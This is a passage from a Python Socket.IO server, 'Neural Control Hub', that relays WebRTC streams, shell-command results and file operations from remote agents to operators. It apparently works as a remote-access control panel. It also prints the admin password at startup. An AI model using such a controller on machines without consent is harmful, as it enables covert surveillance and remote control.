                WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = sender
            except Exception as e:
                print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
        
        # Set up viewer event handlers
        @viewer_pc.on("connectionstatechange")
        async def on_viewer_connectionstatechange():
            print(f"Viewer {viewer_id} connection state: {viewer_pc.connectionState}")
            if viewer_pc.connectionState == "failed":
                await viewer_pc.close()
                if viewer_id in WEBRTC_VIEWERS:
                    del WEBRTC_VIEWERS[viewer_id]
        
        @viewer_pc.on("icecandidate")
        def on_viewer_icecandidate(candidate):
            if candidate:
                emit('webrtc_ice_candidate', {
                    'agent_id': agent_id,
                    'candidate': candidate
                }, room=viewer_id)
        
        # Create offer for viewer
        def create_viewer_offer():
            try:
                loop = asyncio.get_event_loop()
                future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
                future.add_done_callback(lambda f: handle_viewer_offer_created(f, viewer_id))
            except RuntimeError:
                # No event loop, run synchronously
                async def create_offer():
                    offer = await viewer_pc.createOffer()
                    handle_viewer_offer_created_sync(offer, viewer_id)
                asyncio.run(create_offer())
        
        # Run in thread to avoid blocking
        threading.Thread(target=create_viewer_offer, daemon=True).start()
        
        print(f"WebRTC viewer {viewer_id} connected to agent {agent_id}")
        
    except Exception as e:
        print(f"Error connecting WebRTC viewer {viewer_id} to agent {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error connecting viewer: {str(e)}'}, room=request.sid)

def handle_viewer_offer_created(future, viewer_id):
    """Handle viewer offer creation"""
    try:
        offer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer)
            asyncio.run(set_local_desc())
        
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating viewer offer: {str(e)}'}, room=viewer_id)

def handle_viewer_offer_created_sync(offer, viewer_id):
    """Handle viewer offer creation for synchronous context"""
    try:
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending viewer offer: {str(e)}'}, room=viewer_id)

@socketio.on('webrtc_viewer_answer')
def handle_webrtc_viewer_answer(data):
    """Handle viewer answer"""
    viewer_id = request.sid
    answer_sdp = data.get('answer')
    
    if not answer_sdp or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        
        # Use proper async handling for setRemoteDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
            
        print(f"WebRTC viewer answer received from {viewer_id}")
        
    except Exception as e:
        print(f"Error setting viewer answer for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_disconnect')
def handle_webrtc_viewer_disconnect():
    """Handle WebRTC viewer disconnection"""
    viewer_id = request.sid
    
    if viewer_id in WEBRTC_VIEWERS:
        try:
            viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
            
            # Use proper async handling for close
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
            except RuntimeError:
                # No event loop, run synchronously
                async def close_viewer():
                    await viewer_pc.close()
                asyncio.run(close_viewer())
                
            del WEBRTC_VIEWERS[viewer_id]
            print(f"WebRTC viewer {viewer_id} disconnected")
        except Exception as e:
            print(f"Error disconnecting WebRTC viewer {viewer_id}: {e}")

# Advanced WebRTC Monitoring and Optimization Event Handlers
@socketio.on('webrtc_quality_change')
def handle_webrtc_quality_change(data):
    """Handle WebRTC quality change requests from adaptive bitrate control"""
    agent_id = data.get('agent_id')
    quality = data.get('quality')
    bandwidth_stats = data.get('bandwidth_stats')
    
    print(f"Quality change request for {agent_id}: {quality}")
    print(f"Bandwidth stats: {bandwidth_stats}")
    
    # Forward quality change to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_quality_change', {
            'quality': quality,
            'bandwidth_stats': bandwidth_stats
        }, room=agent_sid)
        print(f"Quality change command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for quality change")

@socketio.on('webrtc_frame_dropping')
def handle_webrtc_frame_dropping(data):
    """Handle WebRTC frame dropping requests from load monitoring"""
    agent_id = data.get('agent_id')
    enabled = data.get('enabled')
    drop_ratio = data.get('drop_ratio', 0.3)
    priority = data.get('priority', 'keyframes_only')
    
    print(f"Frame dropping request for {agent_id}: enabled={enabled}, ratio={drop_ratio}, priority={priority}")
    
    # Forward frame dropping command to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_frame_dropping', {
            'enabled': enabled,
            'drop_ratio': drop_ratio,
            'priority': priority
        }, room=agent_sid)
        print(f"Frame dropping command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for frame dropping")

@socketio.on('webrtc_get_enhanced_stats')
def handle_webrtc_get_enhanced_stats(data):
    """Get enhanced WebRTC statistics including performance metrics"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_enhanced_stats', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Get basic stats
        basic_stats = get_webrtc_stats(agent_id)
        
        # Get bandwidth estimation
        bandwidth_stats = estimate_bandwidth(agent_id)
        
        # Get connection quality
        quality_data = monitor_connection_quality(agent_id)
        
        # Get production readiness assessment
        production_readiness = assess_production_readiness()
        
        enhanced_stats = {
            'agent_id': agent_id,
            'basic_stats': basic_stats,
            'bandwidth_stats': bandwidth_stats,
            'quality_data': quality_data,
            'production_readiness': production_readiness,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        emit('webrtc_enhanced_stats', enhanced_stats, room=request.sid)
        print(f"Enhanced stats sent for agent {agent_id}")
        
    except Exception as e:
        print(f"Error getting enhanced stats for {agent_id}: {e}")
        emit('webrtc_enhanced_stats', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_production_readiness')
def handle_webrtc_get_production_readiness():
    """Get production readiness assessment"""
    try:
        readiness_report = assess_production_readiness()
        emit('webrtc_production_readiness', readiness_report, room=request.sid)
        print("Production readiness report sent")
    except Exception as e:
        print(f"Error getting production readiness: {e}")
        emit('webrtc_production_readiness', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_migration_plan')
def handle_webrtc_get_migration_plan():
    """Get mediasoup migration plan"""
    try:
        migration_plan = generate_mediasoup_migration_plan()
        emit('webrtc_migration_plan', migration_plan, room=request.sid)
        print("Mediasoup migration plan sent")
    except Exception as e:
        print(f"Error getting migration plan: {e}")
        emit('webrtc_migration_plan', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_monitoring_data')
def handle_webrtc_get_monitoring_data():
    """Get comprehensive WebRTC monitoring data"""
    try:
        monitoring_data = enhanced_webrtc_monitoring()
        emit('webrtc_monitoring_data', monitoring_data, room=request.sid)
        print("Comprehensive monitoring data sent")
    except Exception as e:
        print(f"Error getting monitoring data: {e}")
        emit('webrtc_monitoring_data', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_adaptive_bitrate_control')
def handle_webrtc_adaptive_bitrate_control(data):
    """Manually trigger adaptive bitrate control"""
    agent_id = data.get('agent_id')
    current_quality = data.get('current_quality', 'auto')
    
    if not agent_id:
        emit('webrtc_adaptive_bitrate_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = adaptive_bitrate_control(agent_id, current_quality)
        emit('webrtc_adaptive_bitrate_result', {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Adaptive bitrate control result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        emit('webrtc_adaptive_bitrate_result', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_implement_frame_dropping')
def handle_webrtc_implement_frame_dropping(data):
    """Manually trigger frame dropping implementation"""
    agent_id = data.get('agent_id')
    load_threshold = data.get('load_threshold', 0.8)
    
    if not agent_id:
        emit('webrtc_frame_dropping_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = implement_frame_dropping(agent_id, load_threshold)
        emit('webrtc_frame_dropping_result', {
            'agent_id': agent_id,
            'result': result,
            'load_threshold': load_threshold,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Frame dropping implementation result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)

# WebRTC scaffolding code removed - not currently active

# Additional WebSocket events for real-time updates

@socketio.on('performance_update')
def handle_performance_update(data):
    """Handle performance metrics updates from agents"""
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        
        # Broadcast performance update to operators
        emit('agent_performance_update', {
            'agent_id': agent_id,
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }, room='operators', broadcast=True)

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command execution results from agents"""
    print(f"🔍 Controller: Command result received: {data}")
    print(f"🔍 Controller: Received from SID: {request.sid}")
    print(f"🔍 Controller: Current agents: {list(AGENTS_DATA.keys())}")
    
    agent_id = data.get('agent_id')
    execution_id = data.get('execution_id')
    command = data.get('command')
    output = data.get('output', '')
    success = data.get('success', False)
    execution_time = data.get('execution_time', 0)
    
    print(f"🔍 Controller: Processing command result for agent {agent_id}")
    print(f"🔍 Controller: Command: {command}")
    print(f"🔍 Controller: Output length: {len(output)}")
    print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
    
    # Broadcast command result to operators
    result_data = {
        'agent_id': agent_id,
        'execution_id': execution_id,
        'command': command,
        'output': output,
        'formatted_text': data.get('formatted_text'),
        'prompt': data.get('prompt'),
        'terminal_type': data.get('terminal_type'),
        'ps_version': data.get('ps_version'),
        'exit_code': data.get('exit_code'),
        'success': success,
        'execution_time': execution_time,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }
    
    print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
    emit('command_result', result_data, room='operators', broadcast=True)
    print(f"🔍 Controller: Command result broadcasted successfully")
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'command',
            'action': 'Command Executed',
            'details': f'Command "{command}" {"completed" if success else "failed"}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
        }, room='operators', broadcast=True)

@socketio.on('stream_status')
def handle_stream_status(data):
    """Handle stream status updates from agents"""
    agent_id = data.get('agent_id')
    stream_type = data.get('type')
    status = data.get('status')  # 'started', 'stopped', 'error'
    quality = data.get('quality', 'unknown')
    
    # Broadcast stream status to operators
    emit('stream_status_update', {
        'agent_id': agent_id,
        'stream_type': stream_type,
        'status': status,
        'quality': quality,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'{stream_type.title()} Stream {"Started" if status == "started" else "Stopped" if status == "stopped" else "Error"}'
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'stream',
            'action': action,
            'details': f'{stream_type.title()} stream {status} on agent {agent_id}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if status in ['started', 'stopped'] else 'error'
        }, room='operators', broadcast=True)

@socketio.on('file_operation_result')
def handle_file_operation_result(data):
    """Handle file operation results from agents"""
    agent_id = data.get('agent_id')
    operation = data.get('operation')  # 'download', 'upload', 'delete'
    file_path = data.get('file_path')
    success = data.get('success', False)
    error_message = data.get('error_message', '')
    file_size = data.get('file_size', 0)
    
    # Broadcast file operation result to operators
    emit('file_operation_result', {
        'agent_id': agent_id,
        'operation': operation,
        'file_path': file_path,
        'success': success,
        'error_message': error_message,
        'file_size': file_size,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'File {operation.title()}'
        details = f'{"Successfully" if success else "Failed to"} {operation} {file_path}'
        if not success and error_message:
            details += f' - {error_message}'
        
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'file',
            'action': action,
            'details': details,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
    }, room='operators', broadcast=True)

@socketio.on('system_alert')
def handle_system_alert(data):
    """Handle system alerts from agents"""
    agent_id = data.get('agent_id')
    alert_type = data.get('type')  # 'warning', 'error', 'critical'
    message = data.get('message')
    details = data.get('details', '')
    
    # Broadcast system alert to operators
    emit('system_alert', {
        'agent_id': agent_id,
        'type': alert_type,
        'message': message,
        'details': details,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'security' if alert_type == 'critical' else 'system',
            'action': f'System {alert_type.title()}',
            'details': message,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'error' if alert_type in ['error', 'critical'] else 'warning'
        }, room='operators', broadcast=True)

@socketio.on('agent_notification')
def handle_agent_notification(data):
    emit('agent_notification', data, room='operators', broadcast=True)

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle heartbeat from agents to keep them alive"""
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        # Update performance metrics if provided
        if 'performance' in data:
            perf = data['performance']
            AGENTS_DATA[agent_id]["cpu_usage"] = perf.get('cpu', 0)
            AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
            AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
        
        # Acknowledge heartbeat
        emit('heartbeat_ack', {'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'})

# Background task to check for disconnected agents
def cleanup_disconnected_agents():
    """Background task to clean up agents that haven't sent heartbeat"""
    import threading
    
    def cleanup():
        while True:
            try:
                current_time = datetime.datetime.utcnow()
                timeout_threshold = 300  # 5 minutes
                
                disconnected_agents = []
                for agent_id, data in list(AGENTS_DATA.items()):
                    if data.get('last_seen'):
                        try:
                            last_seen = datetime.datetime.fromisoformat(data['last_seen'].replace('Z', '+00:00'))
                            if last_seen.tzinfo is None:
                                last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
                            
                            if (current_time.replace(tzinfo=datetime.timezone.utc) - last_seen).total_seconds() > timeout_threshold:
                                disconnected_agents.append(agent_id)
                        except Exception as e:
                            print(f"Error parsing last_seen for agent {agent_id}: {e}")
                            disconnected_agents.append(agent_id)
                
                # Clean up disconnected agents
                for agent_id in disconnected_agents:
                    agent_name = AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")
                    del AGENTS_DATA[agent_id]
                    
                    # Notify operators
                    socketio.emit('agent_list_update', AGENTS_DATA, room='operators')
                    socketio.emit('activity_update', {
                        'id': f'act_{int(time.time())}',
                        'type': 'connection',
                        'action': 'Agent Timeout',
                        'details': f'Agent {agent_id} timed out (no heartbeat)',
                        'agent_id': agent_id,
                        'agent_name': agent_name,
                        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                        'status': 'warning'
                    }, room='operators')
                    
                    print(f"Agent {agent_id} timed out and was removed")
                
                time.sleep(60)  # Check every minute
            except Exception as e:
                print(f"Error in cleanup task: {e}")
                time.sleep(60)
    
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()

# Start the cleanup task
cleanup_disconnected_agents()

if __name__ == "__main__":
    print("Starting Neural Control Hub with Socket.IO + WebRTC support...")
    print(f"Admin password: {Config.ADMIN_PASSWORD}")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (aiortc not available)'}")
    if WEBRTC_AVAILABLE:
        print(f"WebRTC codecs: Video={', '.join(WEBRTC_CONFIG['codecs']['video'])}, Audio={', '.join(WEBRTC_CONFIG['codecs']['audio'])}")
        print(f"WebRTC features: Simulcast={WEBRTC_CONFIG['simulcast']}, SVC={WEBRTC_CONFIG['svc']}")
        print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
        print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
        print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
